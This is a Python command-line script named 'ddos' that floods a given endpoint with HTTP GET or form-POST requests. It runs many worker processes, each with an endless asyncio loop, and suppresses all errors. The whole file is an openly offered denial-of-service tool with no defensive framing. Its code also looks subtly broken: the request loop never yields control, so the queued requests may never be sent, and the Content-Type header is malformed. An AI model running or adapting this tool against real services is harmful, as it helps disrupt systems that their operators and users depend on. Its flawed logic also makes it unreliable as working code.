import click
import multiprocessing
import asyncio
from httpx import AsyncClient
from urllib.parse import urlencode


@click.command('ddos')
@click.option('-w', '--workers', type=click.INT, default=multiprocessing.cpu_count(),
              help='Number of workers sending requests')
@click.option('-d', '--data', multiple=True, help='Data in form-data format to send, If request is GET is ignored')
@click.option('-m', '--method', default='GET', help='Request Method')
@click.argument('endpoint', required=True)
def main(workers, method, endpoint, data):
    data = dict([entry.split('=') for entry in data])
    threads = [multiprocessing.Process(target=fork_worker, args=(method, endpoint, data)) for _ in range(workers)]

    try:
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        for thread in threads:
            thread.kill()


def fork_worker(method, endpoint, data):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(task_stream(method, endpoint, data, loop))
    loop.run_forever()


async def task_stream(method, endpoint, data, loop):
    async with AsyncClient() as http_client:
        if method == 'GET':
            callback = lambda: http_client.get(endpoint)
        else:
            _data = urlencode(data).encode()
            headers = {'Content-Type': 'application/x-www-form'}
            callback = lambda: http_client.request(method, endpoint, headers=headers, content=_data)
        while True:
            loop.create_task(make_request(callback))


async def make_request(fx):
    try:
        await fx()
    except Exception:
        pass


if __name__ == '__main__':
    main()
